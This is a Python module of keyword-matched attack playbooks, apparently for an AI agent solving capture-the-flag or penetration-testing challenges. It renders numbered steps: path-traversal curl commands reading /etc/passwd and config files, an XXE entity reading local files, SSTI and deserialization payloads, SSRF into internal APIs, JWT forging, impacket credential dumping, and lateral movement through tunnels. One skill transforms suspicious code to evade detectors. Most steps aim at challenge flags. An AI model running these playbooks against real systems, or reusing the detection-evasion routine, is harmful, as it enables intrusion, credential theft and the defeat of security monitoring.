"""指纹级技能包：命中就给 3-5 条可执行动作 + 停止规则，不依赖题号/历史。"""

from __future__ import annotations

from playbooks import _base_for

SKILLS: list[dict] = [
    {
        "id": "proto-pollution-pydash",
        "require": [
            ("pydash", "原型链", "prototype pollution"),
            ("cookie", "八进制", "路径解析", "文件读取"),
        ],
        "steps": [
            "找 merge/set 入口参数；用 __proto__/constructor.prototype 注入",
            "Cookie 八进制编码绕过：\141\144\155\151\156 这类形式",
            "pydash 路径解析绕过：__proto__[x] / constructor[prototype][x]",
            "目标：读 /flag 或改模板/命令配置",
        ],
        "stop": "先确认污染点能影响文件读取路径；一次 payload 不中检查编码层，不要盲改业务。",
    },
    {
        "id": "ssrf-internal",
        "require": [
            ("ssrf", "internal-api", "外部数据导入", "连通性检测", "url参数"),
            ("内网", "internal", "诊断工具"),
        ],
        "steps": [
            "找 URL/导入/探测参数，先请求 http://internal-api:5000/debug/config",
            "再枚举 internal-api 的 /debug、/config、/env、/actuator",
            "把内网响应里的凭据/服务继续作为下一跳",
        ],
        "stop": "先验证 SSRF 回显；无回显就试 DNS/时间盲注，不要继续扫外网。",
    },
    {
        "id": "xxe-import",
        "require": [("xml", "批量导入", "图片上传", "xxe")],
        "steps": [
            '上传 XML，插入 <!ENTITY xxe SYSTEM "file:///flag"> 并回显',
            "无回显改 OOB/参数实体；试 php://filter 读源码",
            "结合上传/分类接口找 flag 路径",
        ],
        "stop": "先确认 XML 解析器接受外部实体；一次失败检查 Content-Type/命名空间。",
    },
    {
        "id": "template-unserialize",
        "require": [(".tpl", "模板解析", "反序列化", "模板引擎")],
        "steps": [
            "指纹模板引擎（Twig/Jinja/Freemarker/Velocity）",
            "模板注入读文件/命令：{{7*7}}、${7*7}、<%= 7*7 %>",
            "PHP: phpggc <framework> <chain> <cmd>；Java: ysoserial <gadget> <cmd>",
        ],
        "stop": "先确定引擎再选 payload；模板名可控时直接包含 /flag。",
    },
    {
        "id": "hardcoded-admin",
        "require": [("硬编码", "超管密码", "诊断面板", "日志查询")],
        "steps": [
            "读前端 JS/备份/接口，找硬编码 admin 密码",
            "登录后找日志查询参数，试 SQLi/UNION/堆叠",
            "flag 在数据库里：先列表名，再读目标表",
        ],
        "stop": "先拿登录，再确认查询参数注入点；不要先爆破。",
    },
    {
        "id": "serverless-runtime",
        "require": [("serverless", "云函数", "运行时限制", "认证网关")],
        "steps": [
            "读函数配置/env/角色；试 metadata/临时凭据",
            "列运行时允许的能力（文件/网络/进程）",
            "用配置里的凭据访问对象存储/数据库",
        ],
        "stop": "先看 runtime 限制；被禁的能力换等价路径（读 env/配置/存储）。",
    },
    {
        "id": "weaver-oa",
        "require": [("泛微", "weaver"), ("oa", "ssh", "内网")],
        "steps": [
            "指纹泛微版本：/wui/index.html、/api/...",
            "查对应版本 OA RCE/未授权接口",
            "拿到后台/SSH 凭据后横向；注意内网 SSH",
        ],
        "stop": "先版本再 CVE；一个未授权接口失败换另一个，不要盲扫目录。",
    },
    {
        "id": "1panel",
        "require": [("1panel", "服务器管理控制面板")],
        "steps": [
            "用题面凭据登录 /api/v1/auth/login",
            "读 /api/v1/... 版本、应用、计划任务接口",
            "查 1Panel 对应版本 CVE/未授权命令执行",
        ],
        "stop": "先登录拿 session；API 401 就换 token/cookie 形式，不要继续爆破。",
    },
    {
        "id": "azure-sas",
        "require": [("sas", "临时访问凭证", "azure", "云存储")],
        "steps": [
            "拿 SAS token，解析 sr/se/sp/sig 权限",
            "用 token list containers/blobs，找过度授权",
            "读受保护 blob/凭据",
        ],
        "stop": "先看 token scope；403 就换 container/权限，不要重新申请。",
    },
    {
        "id": "firmware-re",
        "require": [
            ("固件", "可执行文件", "逆向", "mcu", "二进制"),
            ("许可证", "授权码", "校验", "凭据"),
        ],
        "steps": [
            "file/readelf/strings 先看架构；rea inspect <bin> 或 r2 -A <bin> 看函数/字符串",
            "rea decompile <bin> <func> 或 analyzeHeadless 反编译；定位校验函数与成功分支",
            "APK 用 jadx -d out app.apk；固件用 binwalk -e / unsquashfs 解包",
            "构造输入或 patch；pwntools/ropper 辅助",
        ],
        "stop": "先定位校验函数和成功分支；不要全量反编译后才开始。",
    },
    {
        "id": "detection-bypass",
        "require": [("检测机制", "规避", "实现质量", "双轨评分", "可疑代码")],
        "steps": [
            "先提交最小功能代码，确认检测器返回结构",
            "针对检测规则做等价变换：编码/拆分/延迟/间接调用",
            "保持功能成立，逐条消融检测特征",
        ],
        "stop": "先用 3 个样本确定检测器判定，再做定向变异；不要一次改十处。",
    },
    {
        "id": "geoserver",
        "require": [("地理数据", "geoserver", "wms", "空间信息")],
        "steps": [
            "GET /geoserver/web/ 与 /geoserver/rest/about/version.xml",
            "查版本对应 GeoServer CVE（XXE/RCE）",
            "用 WMS/rest 入口打已知漏洞",
        ],
        "stop": "先版本；没有版本就走 /rest 未授权，不要盲扫。",
    },
    {
        "id": "ai-demo-platform",
        "require": [("ai推理", "模型演示", "ollama", "comfyui", "vllm")],
        "steps": [
            "探测 /api/tags、/api/version、/config、/api/predict",
            "读模型文件/插件目录；试路径穿越/代码执行",
            "用平台 API 触发文件读取或命令",
        ],
        "stop": "先版本/模型列表；API 不存在再转前端静态资源。",
    },
    {
        "id": "multi-stage-web",
        "require": [
            (
                "官网",
                "门户网站",
                "全链路",
                "apt",
                "内网",
                "核心数据",
                "firewall",
                "breach",
                "lateral",
                "pivot",
                "multi-stage",
            )
        ],
        "steps": [
            "先打外网 Web：指纹/登录/上传/API，拿第一个立足点与凭据",
            "用凭据访问管理后台/内网服务；只扫描目标网段（10.x），不扫宿主 Docker",
            "每个 flag 后列剩余攻击面，横向到下一跳",
            "复用已确认凭据到 SSH/数据库/对象存储；ssh/sshpass 直连，proxychains4/chisel 做隧道",
            "阶段成果立刻写入 stage 工具（foothold、credential、reachable host），供下一投接力",
        ],
        "stop": "一层打完立刻整理凭据和可达服务；没有新凭据就换入口，不要在同一页反复猜。",
    },
    {
        "id": "web-source-lfi",
        "require": [("download.php", "?id=", "includes", "lfi", "源码", "文件包含", "合同审批")],
        "steps": [
            "curl -s '{base}/download.php?id=../../../../etc/passwd'",
            "curl -s '{base}/download.php?id=../includes/config.php'",
            "curl -s '{base}/download.php?id=../includes/auth.php'",
            "curl -s '{base}/download.php?id=../.htaccess'",
        ],
        "stop": "拿到源码后先 grep 路由/rewrite/approve/admin，再猜文件名；3 次不中即读 DirectoryIndex/000-default.conf。",
    },
    {
        "id": "gremlin-groovy",
        "require": [("gremlin", "hugegraph", "groovy", "tinkerpop", "图数据库")],
        "steps": [
            "curl -s -X POST '{base}/gremlin' -H 'Content-Type: application/json' -d '{\"gremlin\":\"g.V().limit(1)\"}'",
            "curl -s -i '{base}/gremlin'  # 先确认 auth/序列化要求",
            "Groovy: new String(Files.readAllBytes(Paths.get('/challenge/flag.txt')))",
            "Java classloading: Thread.currentThread().getContextClassLoader().getResourceAsStream(...)",
        ],
        "stop": "先确认查询语法/认证；一次 payload 失败就换编码（JSON/Groovy/Java），不要盲改括号。",
    },
    {
        "id": "logic-oracle",
        "require": [
            ("bypass", "score", "threshold", "compare", "oracle"),
            ("check", "校验", "阈值", "逻辑"),
        ],
        "steps": [
            "列出该端点的 3 种响应（成功/失败/异常），做成布尔 oracle",
            "对参数做边界/类型/编码矩阵：0/1/-1/空/超长/布尔/数组/对象",
            "对比成功阈值：return 1 vs return 0、<= vs <、score+1",
        ],
        "stop": "不要猜业务；先用 3 个输入确定 oracle 的判定条件，再构造刚好越界的值。",
    },
    {
        "id": "gradio-langflow",
        "require": [("gradio", "langflow", "7860")],
        "steps": [
            "curl -s -i '{base}/config'",
            "curl -s -i '{base}/api/v1/version'",
            "curl -s -i -X POST '{base}/api/v1/validate/code' -H 'Content-Type: application/json' -d '{\"code\":\"...\"}'",
            "source disclosure: 先读 /config 里的组件/flag 提示",
        ],
        "stop": "先 version → 已知 CVE → 精确 payload；一次失败检查 Content-Type/JSON 形状，再换 CVE。",
    },
    {
        "id": "telnet-interactive",
        "require": [("telnet", ":23", "远程登录")],
        "steps": [
            "nc -w3 {target}  # 读 banner，处理 IAC",
            "默认/弱口令 root:root / admin:admin",
            "登录后 cat /challenge/flag.txt /flag.txt",
        ],
        "stop": "2 组凭据失败即换；拿到 shell 先读 flag，不要继续交互。",
    },
    {
        "id": "jwt-auth",
        "require": [
            ("jwt", "bearer", "json web token"),
            ("token", "cookie", "authorization", "alg"),
        ],
        "steps": [
            "解码 header/payload，确认 alg 与 claim 结构",
            "jwt_tool <token> -T 尝试 none/弱密钥；-C -d wordlist 跑字典",
            "伪造 kid/jku、篡改 role/sub 后用真实接口验证",
        ],
        "stop": "先确认服务端真的校验签名；一次 401 就换 claim/算法，不要盲改。",
    },
    {
        "id": "ad-smb",
        "require": [
            ("smb", "ldap", "kerberos", "active directory", "域控", "域内"),
            ("credential", "password", "hash", "凭据", "用户"),
        ],
        "steps": [
            "enum4linux-ng -A <host>；smbmap -H <host> -u guest 看共享",
            "impacket（secretsdump/psexec/wmiexec）与 certipy 做 AD CS/凭据利用",
            "拿到 hash/凭据后横向；优先读共享目录与配置",
        ],
        "stop": "先确认协议端口与认证方式；匿名失败就换已泄漏凭据，不要盲爆破。",
    },
    {
        "id": "generic-web",
        "require": [("web", "网站", "系统", "平台", "门户", "面板", "http")],
        "steps": [
            "recon web：headers/title/tech；feroxbuster 或 nuclei（模板已内置）快速扫",
            "按指纹试 SQLi/LFI/SSRF/XXE/SSTI/未授权；先读源码/备份",
            "JWT 用 jwt_tool；SSTI 用 SSTImap；每个入口一次最小验证",
        ],
        "stop": "先指纹再选漏洞类；同一入口两次失败就换，不要盲扫大字典。",
    },
    {
        "id": "generic-cloud",
        "require": [("云", "bucket", "sas", "sts", "iam", "对象存储", "serverless")],
        "steps": [
            "枚举凭证/令牌权限与 scope",
            "列对象/函数/角色，找过度授权",
            "用配置里的凭据读受保护数据",
        ],
        "stop": "先 scope 再枚举；403 就换 token/对象，不要重复申请。",
    },
    {
        "id": "generic-pwn",
        "require": [("二进制", "固件", "逆向", "可执行", "许可证", "pwn")],
        "steps": [
            "file/checksec/readelf 先看架构与保护",
            "r2 -A 或 rea decompile 定位 main/校验函数/成功分支",
            "ropper/ROPgadget 找 gadget；本地构造输入或写 pwntools",
        ],
        "stop": "先成功分支再全量分析；不要先做完整反编译。",
    },
]


def generic_for(text: str, target: str = "") -> dict | None:
    low = text.lower()
    t = target.lower()
    if ":23" in t:
        return next((s for s in SKILLS if s["id"] == "telnet-interactive"), None)
    if any(word in low for word in ("固件", "可执行文件", "逆向", "许可证", "mcu")):
        return next((s for s in SKILLS if s["id"] == "generic-pwn"), None)
    if any(
        word in low for word in ("云存储", "sas", "sts", "iam", "bucket", "对象存储", "serverless")
    ):
        return next((s for s in SKILLS if s["id"] == "generic-cloud"), None)
    if any(
        word in low
        for word in (
            "内网",
            "全链路",
            "apt",
            "多阶段",
            "横向",
            "firewall",
            "breach",
            "lateral",
            "pivot",
        )
    ):
        return next((s for s in SKILLS if s["id"] == "multi-stage-web"), None)
    if any(
        port in t
        for port in (":80", ":443", ":3000", ":5000", ":7860", ":8000", ":8080", ":9000", ":10000")
    ):
        return next((s for s in SKILLS if s["id"] == "generic-web"), None)
    return None


def match(text: str) -> dict | None:
    low = text.lower()
    for skill in SKILLS:
        if all(any(keyword.lower() in low for keyword in group) for group in skill["require"]):
            return skill
    return None


def render(skill: dict, target: str = "") -> str:
    base = _base_for(target)
    steps = [
        step.replace("{base}", base).replace("{target}", target or "<target>")
        for step in skill["steps"]
    ]
    lines = [f"# SKILL: {skill['id']} (apply before inventing new paths)"]
    lines.extend(f"{index}. {step}" for index, step in enumerate(steps, 1))
    lines.append(f"STOP RULE: {skill['stop']}")
    return "\n".join(lines)
